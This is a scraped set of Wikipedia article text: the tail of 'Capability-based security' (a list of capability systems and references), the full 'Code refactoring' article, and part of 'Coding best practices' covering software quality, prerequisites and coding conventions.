Notable research and commercial systems employing capability-based security include the following:



Tahoe-LAFS
, an open-source capability-based filesystem


GNOSIS
, an operating system developed at 
Tymshare


KeyKOS
, successor to GNOSIS

EROS, The 
Extremely Reliable Operating System
, successor to KeyKOS

CapROS
, a project to further develop the EROS code base for commercial use


Cambridge CAP computer


Hydra (operating system)
, part of the 
C.mmp
 project at 
Carnegie Mellon University


StarOS, part of the CM* project at 
Carnegie Mellon University


IBM 
System/38
 and 
AS/400


Intel iAPX 432


Plessey System 250


Flex


L4 microkernel family
:

OKL4 from Open Kernel Labs


seL4 from NICTA


Fiasco.OC and NOVA from 
TU Dresden


Amoeba
 distributed operating system


FreeBSD
 
Capsicum
[
3
]
[
4
]


Genode
[
5
]


Google Fuchsia
[
6
]


HarmonyOS
 (
OpenHarmony
) 
[
7
]
[
8
]
[
9
]


Phantom OS
[
10
]


WebAssembly
 System Interface (WASI)


References
[
edit
]






^
 
capabilities(7)
 – 
Linux
 Programmer's 
Manual
 – Overview, Conventions and Miscellanea




^
 
capsicum(4)
 – 
FreeBSD
 Kernel Interfaces 
Manual




^
 
"Capsicum(4)"
.




^
 
Capsicum: practical capabilities for UNIX
. Retrieved 9 July 2024




^
 
"Genode OS: a breath of fresh air in operating system and software security"
. 
Rudd-O.com
. Retrieved 
2023-12-21
.




^
 
"Google's Fuchsia operating system runs on virtually anything"
. 
Engadget
. 2016-08-14
. Retrieved 
2023-12-21
.




^
 
Děcký, Martin. 
"Microkernel-based and Capability-based Operating Systems"
 
(PDF)
. 
D3S
. Retrieved 
23 December
 2023
.




^
 
"docs/en/application-dev/security/accesstoken-overview.md at master · openharmony/docs"
. 
GitHub
. Retrieved 
2024-05-04
.




^
 
DARKNAVY (2024-06-11). 
"AVSS Report: System Security Adversarial Capability Preliminary Evaluation of iOS, Android, and HarmonyOS - Kernel"
. 
DARKNAVY
. Retrieved 
2024-07-04
.




^
 
Dziuba, Ted. 
"Russian rides Phantom to OS immortality"
. 
The Register
. Retrieved 
31 December
 2023
.






Levy, Henry M., 
*
Capability-Based Computer Systems
, Digital Equipment Corporation 1984. 
ISBN
 
0-932376-22-3
. An electronic version is available 
here
.


The EROS Project


E
, a programming language based around capability security (
ERights.org
)


Mark S. Miller, Ka-Ping Yee, Jonathan Shapiro. 
Capability Myths Demolished
, Technical Report SRL2003-02, Systems Research Laboratory, Johns Hopkins University. 
Available online.


The Cambridge CAP Computer
, Levy, 1988


Further reading
[
edit
]


Capability-based addressing
: 
Theodore A. Linden (December 1976). "Operating System Structures to Support Security and Reliable Software". 
ACM Computing Surveys
. 
8
 (4): 409–445. 
doi
:
10.1145/356678.356682
. 
hdl
:
2027/mdp.39015086560037
. 
ISSN
 
0360-0300
. 
S2CID
 
16720589
.


Li Gong
, 
A Secure Identity-Based Capability System
, sp, p. 56, 1989 IEEE Symposium on Security and Privacy, 1989


Capability-based addressing


A hardware implementation of capability-based addressing


An implementation of capabilities on the PDP-11/45


IBM System/38 support for capability-based addressing


EROS: a fast capability system


POSIX "capabilities" in Linux:



POSIX Capabilities & Files


POSIX file capabilities: Parceling the power of root


Making Root Unprivileged


Security issues and new risks linked to POSIX file capabilities


Linux manual page for "capabilities(7)"


Working with Linux capabilities


External links
[
edit
]


"What is a Capability?"


Reviews of 'Capability Myths Demolished'


Capability Theory by Sound Bytes


v
t
e
Object-capability
 security
Concepts


Principle of least privilege
 (PoLP)


Confused deputy problem


Ambient authority


File descriptor


C-list


Object-capability model


Capability-based security


Capability-based addressing


Zooko's triangle


Petnames


Operating systems
, 
kernels


Capsicum


Fuchsia


Genode


GNOSIS
 → 
KeyKOS
 → 
EROS
 → 
CapROS


Hydra


iMAX 432


Midori


NLTSS


seL4


HarmonyOS
 (
HarmonyOS NEXT
)


Phantom OS


Programming languages


Cajita


E


Joe-E


Joule


File systems


Tahoe-LAFS


Specialised hardware


BiiN


Cambridge CAP


Flex


IBM System/38


Intel iAPX 432


Plessey System 250












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Capability-based_security&oldid=1233505110
"


Categories
: 
Computer security models
Access control
Capability systems
Hidden categories: 
Articles with short description
Short description is different from Wikidata











From Wikipedia, the free encyclopedia






Restructuring existing computer code without changing its external behavior


"Refactoring" redirects here. For its use on Wikipedia, see 
Wikipedia:Refactoring talk pages
.


This article is about a behaviour-preserving change. Not to be confused with 
Rewrite (programming)
.


In 
computer programming
 and 
software design
, 
code refactoring
 is the process of restructuring existing 
source code
—changing the 
factoring
—without changing its external behavior. Refactoring is intended to improve the design, structure, and/or implementation of the 
software
 (its 
non-functional
 attributes), while preserving its 
functionality
. Potential advantages of refactoring may include improved code 
readability
 and reduced 
complexity
; these can improve the 
source code
'
s 
maintainability
 and create a simpler, cleaner, or more expressive internal 
architecture
 or 
object model
 to improve 
extensibility
. Another potential goal for refactoring is improved performance; software engineers face an ongoing challenge to write programs that perform faster or use less memory.

Typically, refactoring applies a series of standardized basic 
micro-refactorings
, each of which is (usually) a tiny change in a computer program's source code that either preserves the behavior of the software, or at least does not modify its conformance to functional requirements. Many 
development environments
 provide automated support for performing the mechanical aspects of these basic refactorings. If done well, code refactoring may help software developers discover and fix hidden or dormant 
bugs
 or 
vulnerabilities
 in the system by simplifying the underlying logic and eliminating unnecessary levels of complexity. If done poorly, it may fail the requirement that external functionality not be changed, and may thus introduce new bugs.



By continuously improving the design of code, we make it easier and easier to work with. This is in sharp contrast to what typically happens: little refactoring and a great deal of attention paid to expediently add new features. If you get into the hygienic habit of refactoring continuously, you'll find that it is easier to extend and maintain code.
— 
Joshua Kerievsky, 
Refactoring to Patterns
[
1
]




Motivation
[
edit
]


Refactoring is usually motivated by noticing a 
code smell
.
[
2
]
 For example, the method at hand may be very long, or it may be a near 
duplicate
 of another nearby method. Once recognized, such problems can be addressed by 
refactoring
 the source code, or transforming it into a new form that behaves the same as before but that no longer "smells".

For a long routine, one or more smaller subroutines can be extracted; or for duplicate routines, the duplication can be removed and replaced with one shared function. Failure to perform refactoring can result in accumulating 
technical debt
; on the other hand, refactoring is one of the primary means of repaying technical debt.
[
3
]




Benefits
[
edit
]


There are two general categories of benefits to the activity of refactoring.



Maintainability
. It is easier to fix bugs because the source code is easy to read and the intent of its author is easy to grasp.
[
4
]
 This might be achieved by reducing large monolithic routines into a set of individually concise, well-named, single-purpose methods. It might be achieved by moving a method to a more appropriate class, or by removing misleading comments.


Extensibility
. It is easier to extend the capabilities of the application if it uses recognizable 
design patterns
, and it provides some flexibility where none before may have existed.
[
1
]


Performance engineering can remove inefficiencies in programs, known as software bloat, arising from traditional software-development strategies that aim to minimize an application's development time rather than the time it takes to run. Performance engineering can also tailor 
software
 to the 
hardware
 on which it runs, for example, to take advantage of parallel processors and vector units.
[
5
]




Timing and responsibility
[
edit
]


There are two possible times for refactoring.



Preventive refactoring – the original developer of the code makes the code more robust when it is still free of 
smells
 to prevent the formation of smells in the future.
[
6
]


Corrective refactoring – a subsequent developer performs refactoring to correct 
code smells
 as they occur. 
[
6
]


A method that balances preventive and corrective refactoring is "shared responsibility for refactoring".
This approach splits the refactoring action into two stages and two
roles. The original developer of the code just prepares the code for refactoring, and when the 
code smells
 form, a subsequent developer carries out the actual refactoring action. 
[
6
]




Challenges
[
edit
]


Refactoring requires extracting software system structure, data models, and intra-application dependencies to get back knowledge of an existing software system.
[
7
]

The turnover of teams implies missing or inaccurate knowledge of the current state of a system and about design decisions made by departing developers. Further code refactoring activities may require additional effort to regain this knowledge.
[
8
]

Refactoring activities generate architectural modifications that deteriorate the structural architecture of a software system. Such deterioration affects architectural properties such as maintainability and comprehensibility which can lead to a complete re-development of software systems.

[
9
]


Code refactoring activities are secured with 
software intelligence
 when using tools and techniques providing data about algorithms and  sequences of code execution.
[
10
]
 Providing a comprehensible format for the inner-state of software system structure, data models, and intra-components dependencies is a critical element to form a high-level understanding and then refined views of what needs to be modified, and how.
[
11
]




Testing
[
edit
]


Automatic 
unit tests
 should be set up before refactoring to ensure routines still behave as expected.
[
12
]
 Unit tests can bring stability to even large refactors when performed with a single 
atomic commit
. A common strategy to allow safe and atomic refactors spanning multiple projects is to store all projects in a single 
repository
, known as 
monorepo
.
[
13
]


With unit testing in place, refactoring is then an iterative cycle of making a small 
program transformation
, testing it to ensure correctness, and making another small transformation. If at any point a test fails, the last small change is undone and repeated in a different way. Through many small steps the program moves from where it was to where you want it to be. For this very iterative process to be practical, the tests must run very quickly, or the programmer would have to spend a large fraction of their time waiting for the tests to finish. Proponents of 
extreme programming
 and other 
agile software development
 describe this activity as an integral part of the 
software development cycle
.



Techniques
[
edit
]


Here are some examples of micro-refactorings; some of these may only apply to certain languages or language types. A longer list can be found in 
Martin Fowler
's refactoring book
[
2
]
[
page needed
]
 and website.
[
14
]
 Many development environments provide automated support for these micro-refactorings. For instance, a programmer could click on the name of a variable and then select the "Encapsulate field" refactoring from a 
context menu
. The IDE would then prompt for additional details, typically with sensible defaults and a preview of the code changes. After confirmation by the programmer it would carry out the required changes throughout the code.



Techniques that allow for more 
understanding


Program Dependence Graph
 - explicit representation of data and control dependencies 
[
15
]


System Dependence Graph - representation of procedure calls between PDG 
[
16
]


Software intelligence
 - reverse engineers the initial state to understand existing intra-application dependencies


Techniques that allow for more 
abstraction


Encapsulate field
 – force code to access the field with getter and setter methods


Generalize type
 – create more general types to allow for more code sharing


Replace type-checking code with state/strategy
[
17
]


Replace conditional with 
polymorphism
[
18
]


Techniques for breaking code apart into more logical pieces

Componentization breaks code down into reusable semantic units that present clear, well-defined, simple-to-use interfaces.


Extract class
 moves part of the code from an existing class into a new class.


Extract method, to turn part of a larger 
method
 into a new method. By breaking down code in smaller pieces, it is more easily understandable. This is also applicable to 
functions
.


Techniques for improving names and location of code

Move method or move field – move to a more appropriate 
class
 or source file


Rename method or rename field – changing the name into a new one that better reveals its purpose


Pull up – in 
object-oriented programming
 (OOP), move to a 
superclass


Push down – in OOP, move to a 
subclass
[
14
]


Automatic 
clone detection
[
19
]


Hardware refactoring
[
edit
]


While the term 
refactoring
 originally referred exclusively to refactoring of software code, in recent years code written in 
hardware description languages
 has also been refactored. The term 
hardware refactoring
 is used as a shorthand term for refactoring of code in hardware description languages. Since hardware description languages are not considered to be 
programming languages
 by most hardware engineers,
[
20
]
 hardware refactoring is to be considered a separate field from traditional code refactoring.

Automated refactoring of analog hardware descriptions (in 
VHDL-AMS
) has been proposed by Zeng and Huss.
[
21
]
 In their approach, refactoring preserves the simulated behavior of a hardware design. The non-functional measurement that improves is that refactored code can be processed by standard synthesis tools, while the original code cannot. Refactoring of digital hardware description languages, albeit manual refactoring, has also been investigated by 
Synopsys
 
fellow
 Mike Keating.
[
22
]
[
23
]
 His target is to make complex systems easier to understand, which increases the designers' productivity.



History
[
edit
]


The first known use of the term "refactoring" in the published literature was in a September, 1990 article by 
William Opdyke
 and 
Ralph Johnson
.
[
24
]

Although refactoring code has been done informally for decades, 
William Griswold
's 1991 Ph.D. dissertation
[
25
]

is one of the first major academic works on refactoring functional and procedural programs, followed by 
William Opdyke
's 1992 dissertation
[
26
]

on the refactoring of object-oriented programs,
[
27
]
 although all the theory and machinery have long been available as 
program transformation
 systems. All of these resources provide a catalog of common methods for refactoring; a refactoring method has a description of how to apply the 
method
 and indicators for when you should (or should not) apply the method.

Martin Fowler
's book 
Refactoring: Improving the Design of Existing Code
 is the canonical reference. 
[
according to whom?
]


The terms "factoring" and "factoring out" have been used in this way in the 
Forth
 community since at least the early 1980s. Chapter Six of 
Leo Brodie
's book 
Thinking Forth
 (1984)
[
28
]
 is dedicated to the subject.

In extreme programming, the Extract Method refactoring technique has essentially the same meaning as factoring in Forth; to break down a "word" (or 
function
) into smaller, more easily maintained functions.

Refactorings can also be reconstructed
[
29
]
 posthoc to produce concise descriptions of complex software changes recorded in software repositories like CVS or SVN.



Automated code refactoring
[
edit
]


This section 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
 in this section. Unsourced material may be challenged and removed.
Find sources:
 
"Code refactoring"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
July 2018
)
 (
Learn how and when to remove this message
)


Many software 
editors
 and 
IDEs
 have automated refactoring support.  Here is a list of a few of these editors, or so-called 
refactoring browsers
.



DMS Software Reengineering Toolkit
 (Implements large-scale refactoring for C, C++, C#, COBOL, Java, PHP and other languages)


Eclipse based:

Eclipse
 (for 
Java
, and to a lesser extent, C++, PHP, Ruby and JavaScript)


PyDev
 (for 
Python
)


Photran
 (a 
Fortran
 plugin for the 
Eclipse IDE
)


Embarcadero Delphi


IntelliJ based:

Resharper
 (for 
C#
)


AppCode
 (for 
Objective-C
, C and C++)


IntelliJ IDEA
 (for 
Java
)


PyCharm
 (for 
Python
)


WebStorm
 (for 
JavaScript
)


PhpStorm
 (for 
PHP
)


Android Studio
 (for 
Java
 and C++)


JDeveloper
 (for 
Java
)


NetBeans
 (for 
Java
)


Smalltalk
: Most dialects include powerful refactoring tools. Many use the original refactoring browser produced in the early '90s by 
Ralph Johnson
.


Visual Studio based:

Visual Studio
 (for .NET and C++)


Visual Assist
 (addon for Visual Studio with refactoring support for C# and C++)


Wing IDE
 (for 
Python
)


Xcode
 (for C, 
Objective-C
, and 
Swift
)
[
30
]


Qt Creator
 (for C++, Objective-C and QML)
[
31
]


See also
[
edit
]


Amelioration pattern


Code review


Database refactoring


Decomposition (computer science)


Modular programming


Obfuscated code


Prefactoring


Rewrite (programming)


Separation of concerns


Software peer review


Test-driven development


References
[
edit
]






^ 
a
 
b
 
Kerievsky, Joshua (2004). 
Refactoring to Patterns
. Addison Wesley.




^ 
a
 
b
 
Fowler, Martin
 (1999). 
Refactoring. Improving the Design of Existing Code
. Addison-Wesley. pp. 
63ff
. 
ISBN
 
978-0-201-48567-7
.




^
 
Suryanarayana, Girish (November 2014). 
Refactoring for Software Design Smells
. Morgan Kaufmann. p. 258. 
ISBN
 
978-0128013977
.




^
 
Martin, Robert (2009). 
Clean Code
. Prentice Hall.




^
 
Leiserson, Charles E.; Thompson, Neil C.; Emer, Joel S.; Kuszmaul, Bradley C.; Lampson, Butler W.; Sanchez, Daniel; Schardl, Tao B. (2020). 
"There's plenty of room at the Top: What will drive computer performance after Moore's law?"
. 
Science
. 
368
 (6495): eaam9744. 
doi
:
10.1126/science.aam9744
. 
PMID
 
32499413
.




^ 
a
 
b
 
c
 


Fraivert, Dov; Lorenz, David H. (2022). "Language Support for Refactorability Decay Prevention". 
Proceedings of the 21st ACM SIGPLAN International Conference on Generative Programming: Concepts and Experiences
. pp. 122–134. 
doi
:
10.1145/3564719.3568688
. 
ISBN
 
978-1-4503-9920-3
.




^
 


Haendler, Thorsten; Neumann, Gustaf (2019). "A Framework for the Assessment and Training of Software Refactoring Competences". 
Proceedings of the 11th International Joint Conference on Knowledge Discovery, Knowledge Engineering and Knowledge Management
. pp. 307–316. 
doi
:
10.5220/0008350803070316
. 
ISBN
 
978-989-758-382-7
. 
S2CID
 
204754665
.




^
 


Nassif, Matthieu; Robillard, Martin P. (November 2017). 
Revisiting Turnover-Induced Knowledge Loss in Software Projects
. 2017 IEEE International Conference on Software Maintenance and Evolution (ICSME). pp. 261–272. 
doi
:
10.1109/ICSME.2017.64
. 
ISBN
 
978-1-5386-0992-7
. 
S2CID
 
13147063
.




^
 


van Gurp, Jilles; Bosch, Jan (March 2002). "Design erosion: problems and causes". 
Journal of Systems and Software
. 
61
 (2): 105–119. 
doi
:
10.1016/S0164-1212(01)00152-2
.




^
 


Hassan, Ahmed E.; Xie, Tao (November 2010). "Software intelligence: the future of mining software engineering data". 
Proceedings of the FSE/SDP Workshop on Future of Software Engineering Research (FoSER '10)
. pp. 161–166. 
doi
:
10.1145/1882362.1882397
. 
S2CID
 
3485526
.




^
 


Novais, Renato; Santos, José Amancio; Mendonça, Manoel (2017). "Experimentally assessing the combination of multiple visualization strategies for software evolution analysis". 
Journal of Systems and Software
. 
128
: 56–71. 
doi
:
10.1016/j.jss.2017.03.006
.




^
 
Fowler, Martin (1999). 
Refactoring : improving the design of existing code
. Reading, MA: Addison-Wesley. 
ISBN
 
978-0201485677
. 
OCLC
 
41017370
.




^
 
Smart, John Ferguson (2008). 
Java Power Tools
. "O'Reilly Media, Inc.". p. 301. 
ISBN
 
9781491954546
. Retrieved 
26 July
 2018
.




^ 
a
 
b
 
(these are only about OOP however).
Refactoring techniques in Fowler's refactoring Website




^
 


Ferrante, Jeanne; Ottenstein, Karl J.; Warren, Joe D. (July 1987). 
"The program dependence graph and its use in optimization"
. 
ACM Transactions on Programming Languages and Systems
. 
9
 (3). ACM: 319–349. 
doi
:
10.1145/24039.24041
. 
S2CID
 
505075
.




^
 


Donglin, Linag; Harrold, M. J. (November 2008). "Slicing objects using system dependence graphs". 
Proceedings, International Conference on Software Maintenance (Cat. No. 98CB36272)
. IEEE. pp. 319–349. 
doi
:
10.1109/ICSM.1998.738527
. 
ISBN
 
978-0-8186-8779-2
. 
S2CID
 
18160599
.




^
 
"Replace type-checking code with State/Strategy"
.




^
 
"Replace conditional with polymorphism"
.




^
 
Bruntink, M.; van Deursen, A.; Tourwe, T.; van Engelen, R. (2004). "An evaluation of clone detection techniques for crosscutting concerns". 
Proceedings, 20th IEEE International Conference on Software Maintenance
. IEEE. 
doi
:
10.1109/ICSM.2004.1357804
.




^
 
Hardware description languages#HDL and programming languages




^
 
Kaiping Zeng, Sorin A. Huss, "Architecture refinements by code refactoring of behavioral VHDL-AMS models". ISCAS 2006




^
 
M. Keating :"Complexity, Abstraction, and the Challenges of Designing Complex Systems", in DAC'08 tutorial 
[1]
 
Archived
 2016-03-28 at the 
Wayback Machine
"Bridging a Verification Gap: C++ to RTL for Practical Design"




^
 
M. Keating, P. Bricaud: 
Reuse Methodology Manual for System-on-a-Chip Designs
, Kluwer Academic Publishers, 1999.




^
 
Opdyke, William F.
; Johnson, Ralph E. (September 1990). "Refactoring: An Aid in Designing Application Frameworks and Evolving Object-Oriented Systems". 
Proceedings of the Symposium on Object Oriented Programming Emphasizing Practical Applications (SOOPPA)
. ACM.




^
 
Griswold, William G
 (July 1991). 
Program Restructuring as an Aid to Software Maintenance
 
(PDF)
 (Ph.D. thesis). University of Washington
. Retrieved 
2011-12-24
.




^
 
Opdyke, William F
 (June 1992). 
Refactoring Object-Oriented Frameworks
 (Ph.D. thesis). University of Illinois at Urbana-Champaign. Archived from the original on 2019-12-16
. Retrieved 
2008-02-12
.
{{
cite thesis
}}
:  CS1 maint: bot: original URL status unknown (
link
)




^
 
"Martin Fowler, "MF Bliki: EtymologyOfRefactoring"
"
.




^
 
Brodie, Leo (2004). 
Thinking Forth
. Fig Leaf Press, Forth Interest. pp. 171–196. 
ISBN
 
0-9764587-0-5
. Archived from 
the original
 on 16 December 2005
. Retrieved 
3 May
 2020
.




^
 
Sokolov, Andriy. 
"What is code refactoring?"
.




^
 
"What's new in Xcode 9"
.




^
 
"Overview | Qt Creator Documentation"
.






Further reading
[
edit
]


Wake, William C. (2003). 
Refactoring Workbook
. Addison-Wesley. 
ISBN
 
978-0-321-10929-3
.


Mens, T.; Tourwe, T. (February 2004). 
"A survey of software refactoring"
. 
IEEE Transactions on Software Engineering
. 
30
 (2): 126–139. 
doi
:
10.1109/tse.2004.1265817
. 
ISSN
 
0098-5589
. 
S2CID
 
206778272
.


Feathers, Michael C (2004). 
Working Effectively with Legacy Code
. Prentice Hall. 
ISBN
 
978-0-13-117705-5
.


Kerievsky, Joshua (2004). 
Refactoring To Patterns
. Addison-Wesley. 
ISBN
 
978-0-321-21335-8
.


Arsenovski, Danijel (2008). 
Professional Refactoring in Visual Basic
. Wrox. 
ISBN
 
978-0-470-17979-6
.


Arsenovski, Danijel (2009). 
Professional Refactoring in C# and ASP.NET
. Wrox. 
ISBN
 
978-0-470-43452-9
.


Ritchie, Peter (2010). 
Refactoring with Visual Studio 2010
. Packt. 
ISBN
 
978-1-84968-010-3
.


External links
[
edit
]


What Is Refactoring?
 (c2.com article)


Martin Fowler's homepage about refactoring


‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Refactoring
 at 
Curlie


Authority control databases
 
International
FAST
National
Germany
United States
Japan
Czech Republic
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Code_refactoring&oldid=1244881983
"


Categories
: 
Code refactoring
Extreme programming
Technology neologisms
Hidden categories: 
Webarchive template wayback links
CS1 maint: bot: original URL status unknown
Articles with short description
Short description is different from Wikidata
Wikipedia articles needing page number citations from July 2018
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from July 2018
Articles needing additional references from July 2018
All articles needing additional references
Articles with Curlie links











From Wikipedia, the free encyclopedia






Informal guidelines used by software developers


This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article includes a list of general 
references
, but 
it lacks sufficient corresponding 
inline citations
.
 Please help to 
improve
 this article by 
introducing
 more precise citations.
 
(
July 2012
)
 (
Learn how and when to remove this message
)


This article's 
tone or style may not reflect the 
encyclopedic tone
 used on Wikipedia
.
 See Wikipedia's 
guide to writing better articles
 for suggestions.
 
(
March 2008
)
 (
Learn how and when to remove this message
)




 (
Learn how and when to remove this message
)


Coding best practices
 or 
programming best practices
 are a set of informal, sometimes personal, rules (
best practices
) that many 
software developers
, in 
computer programming
 follow to improve 
software quality
.
[
1
]
 Many computer programs require being robust and reliable for long periods of time,
[
2
]
 so any rules need to facilitate both initial development and subsequent maintenance of 
source code
 by people other than the original authors.

In the 
ninety–ninety rule
, Tom Cargill explains why programming projects often run late: "The first 90% of the code takes the first 90% of the development time. The last 10% takes another 90% of the time."
[
3
]
 Any guidance which can redress this lack of foresight is worth considering.

The size of a project or program has a significant effect on error rates, 
programmer productivity
, and the amount of management needed.
[
4
]






Software quality
[
edit
]


Main article: 
Software quality


As listed below, there are many attributes associated with good 
software
. Some of these can be mutually contradictory (e.g. being very fast versus performing extensive error checking), and different customers and participants may have different priorities. Weinberg provides an example of how different goals can have a dramatic effect on both effort required and efficiency.
[
5
]
 Furthermore, he notes that programmers will generally aim to achieve any explicit goals which may be set, probably at the expense of any other quality attributes.

Sommerville has identified four generalized attributes which are not concerned with what a program does, but how well the program does it: 
Maintainability
, 
dependability
, 
efficiency
 and 
usability
.
[
6
]


Weinberg has identified four targets which a good program should meet:
[
7
]




Does a program meet its 
specification
 ("correct output for each possible input")?


Is the program produced on schedule (and within budget)?


How adaptable is the program to cope with changing requirements?


Is the program efficient enough for the environment in which it is used?


Hoare
 has identified seventeen objectives related to software quality, including:
[
8
]




Clear definition of purpose.


Simplicity
 of use.


Ruggedness (difficult to misuse, kind to errors).


Early availability (delivered on time when needed).


Reliability.


Extensibility
 in the light of experience.


Brevity.


Efficiency (fast enough for the purpose to which it is put).


Minimum cost to develop.


Conformity to any relevant 
standards
 (including 
programming language-specific standards
).


Clear, accurate and precise 
user documents
.


Prerequisites
[
edit
]


Before coding starts, it is important to ensure that all necessary prerequisites have been completed (or have at least progressed far enough to provide a solid foundation for coding). If the various prerequisites are not satisfied, then the software is likely to be unsatisfactory, even if it is completed.

From Meek & Heath: "What happens before one gets to the coding stage is often of crucial importance to the success of the project."
[
9
]


The prerequisites outlined below cover such matters as:



How is the development structured? (life cycle)


What is the software meant to do? (requirements)


What is the overall structure of the software system? (architecture)


What is the detailed design of individual components? (design)


What is the choice of programming language(s)?


For small simple projects it may be feasible to combine architecture with design and adopt a very simple life cycle.



Life cycle
[
edit
]


Main article: 
Software development methodology


A software development methodology is a framework that is used to structure, plan, and control the life cycle of a software product. Common methodologies include 
waterfall
, 
prototyping
, 
iterative and incremental development
, 
spiral development
, 
agile software development
, 
rapid application development
, and 
extreme programming
.

The waterfall model is a sequential development approach; in particular, it assumes that the requirements can be completely defined at the start of a project. However, McConnell quotes three studies that indicate that, on average, requirements change by around 25% during a project.
[
10
]
 The other methodologies mentioned above all attempt to reduce the impact of such requirement changes, often by some form of step-wise, incremental, or iterative approach. Different methodologies may be appropriate for different development environments.

Since its introduction in 2001, agile software development has grown in popularity, fueled by software developers seeking a more iterative, collaborative approach to software development.
[
11
]




Requirements
[
edit
]


Main article: 
Requirements engineering


McConnell states: "The first prerequisite you need to fulfill before beginning construction is a clear statement of the problem the system is supposed to solve."
[
12
]


Meek and Heath emphasise that a clear, complete, precise, and unambiguous written specification is the target to aim for.
[
13
]
 Note that it may not be possible to achieve this target, and the target is likely to change anyway (as mentioned in the previous section).

Sommerville distinguishes between less detailed user requirements and more detailed system requirements.
[
14
]
 He also distinguishes between functional requirements (e.g. update a record) and non-functional requirements (e.g. response time must be less than 1 second).



Architecture
[
edit
]


Main article: 
Software architecture


Hoare points out: "there are two ways of constructing a software design: one way is to make it so simple that there are 
obviously
 no deficiencies; the other way is to make it so complicated that there are no 
obvious
 deficiencies. The first method is far more difficult."
[
15
]


Software architecture is concerned with deciding what has to be done and which program component is going to do it (how something is done is left to the detailed design phase below). This is particularly important when a software system contains more than one program since it effectively defines the interface between these various programs. It should include some consideration of any user interfaces as well, without going into excessive detail.

Any non-functional system requirements (response time, reliability, maintainability, etc.) need to be considered at this stage.
[
16
]


The software architecture is also of interest to various stakeholders (sponsors, end-users, etc.) since it gives them a chance to check that their requirements can be met.



Design
[
edit
]


Main article: 
Software design


The primary purpose of design is to fill in the details which have been glossed over in the architectural design. The intention is that the design should be detailed enough to provide a good guide for actual coding, including details of any particular algorithms to be used. For example, at the architectural level, it may have been noted that some data has to be sorted, while at the design level, it is necessary to decide which sorting algorithm is to be used. As a further example, if an object-oriented approach is being used, then the details of the objects must be determined (attributes and methods).



Choice of programming language(s)
[
edit
]


Mayer states: "No programming language is perfect. There is not even a single best language; there are only languages well suited or perhaps poorly suited for particular purposes. Understanding the problem and associated programming requirements is necessary for choosing the language best suited for the solution."
[
17
]


From Meek & Heath: "The essence of the art of choosing a language is to start with the problem, decide what its requirements are, and their relative importance since it will probably be impossible to satisfy them all equally well. The available languages should then be measured against the list of requirements, and the most suitable (or least unsatisfactory) chosen."
[
18
]


It is possible that different programming languages may be appropriate for different aspects of the problem. If the languages or their compilers permit, it may be feasible to mix routines written in different languages within the same program.

Even if there is no choice as to which programming language is to be used, McConnell provides some advice: "Every programming language has strengths and weaknesses. Be aware of the specific strengths and weaknesses of the language you're using."
[
19
]




Coding standards
[
edit
]


Main article: 
Coding conventions


This section is also really a prerequisite to coding, as McConnell points out: "Establish programming conventions before you begin programming. It's nearly impossible to change code to match them later."
[
19
]


As listed near the end of 
coding conventions
, there are different conventions for different programming languages, so it may be counterproductive to apply the same conventions across different languages. It is important to note that there is no one particular coding convention for any programming language. Every organization has a custom coding standard for each type of software project. It is, therefore, imperative that the programmer chooses or makes up a particular set of coding guidelines before the software project commences. Some coding conventions are generic, which may not apply for every software project written with a particular programming language.

The use of coding conventions is particularly important when a project involves more than one programmer (there have been projects with thousands of programmers). It is much easier for a programmer to read code written by someone else if all code follows the same conventions.

For some examples of bad coding conventions, Roedy Green provides a lengthy (tongue-in-cheek) article on how to produce unmaintainable code.
[
20
]




Commenting
[
edit
]


Due to time restrictions or enthusiastic programmers who want immediate results for their code, commenting of code often takes a back seat. Programmers working as a team have found it better to leave comments behind since coding usually follows cycles, or more than one person may work on a particular module. However, some commenting can decrease the cost of knowledge transfer between developers working on the same module.

In the early days of computing, one commenting practice was to leave a brief description of the following:



Name of the module


Purpose of the Module


Description of the Module


Original Author


Modifications


Authors who modified code with a description on why it was modified.


The "description of the module" should be as brief as possible but without sacrificing clarity and comprehensiveness.

However, the last two items have largely been obsoleted by the advent of 
revision control systems
. Modifications and their authorship can be reliably tracked by using such tools rather than by using comments.

Also, if complicated logic is being used, it is a good practice to leave a comment "block" near that part so that another programmer can understand what exactly is happening.

Unit testing
 can be another way to show how code is intended to be used. 



Naming conventions
[
edit
]


See also: 
Hungarian notation


Use of proper naming conventions is considered good practice. Sometimes programmers tend to use X1, Y1, etc. as variables and forget to replace them with meaningful ones, causing confusion.

It is usually considered good practice to use descriptive names.

Example: A variable for taking in weight as a parameter for a truck can be named TrkWeight, TruckWeightKilograms or Truck_Weight_Kilograms, with TruckWeightKilograms (See 
Pascal case
 naming of variables) often being the preferable one since it is instantly recognizable, but naming convention is not always consistent between projects and/or companies.



Keep the code simple
[
edit
]


The code that a programmer writes should be simple. Complicated logic for achieving a simple thing should be kept to a minimum since the code might be modified by another programmer in the future. The logic one programmer implemented may not make perfect sense to another. So, always keep the code as simple as possible.
[
21
]




Portability
[
edit
]


Program code should not contain "hard-coded" (literal) values referring to environmental parameters, such as absolute file paths, file names, user names, host names, IP addresses, and URLs, UDP/TCP ports. Otherwise, the application will not run on a host that has a different design than anticipated. A careful programmer can parametrize such variables and configure them for the hosting environment outside of the application proper (for example, in property files, on an application server, or even in a database). Compare the mantra of a "single point of definition".
[
22
]
(SPOD).

As an extension, resources such as XML files should also contain variables rather than literal values, otherwise, the application will not be portable to another environment without editing the XML files. For example, with J2EE applications running in an application server, such environmental parameters can be defined in the scope of the JVM, and the application should get the values from there.



Scalability
[
edit
]


Design code with scalability as a design goal because very often in software projects, new features are always added to a project which becomes bigger. Therefore, the facility to add new features to a software code base becomes an invaluable method in writing software.



Reusability
[
edit
]


Re-use is a very important design goal in software development. Re-use cuts development costs and also reduces the time for development if the components or modules which are reused are already tested. Very often, software projects start with an existing baseline that contains the project in its prior version and depending on the project, many of existing software modules and components are reused, which reduces development and testing time, therefore, increasing the probability of delivering a software project on schedule.



Construction guidelines in brief
[
edit
]


A general overview of all of the above:



Know what the code block must perform


Maintain naming conventions which are uniform throughout.


Indicate a brief description of what a variable is for (reference to commenting)


Correct errors as they occur.


Keep your code simple


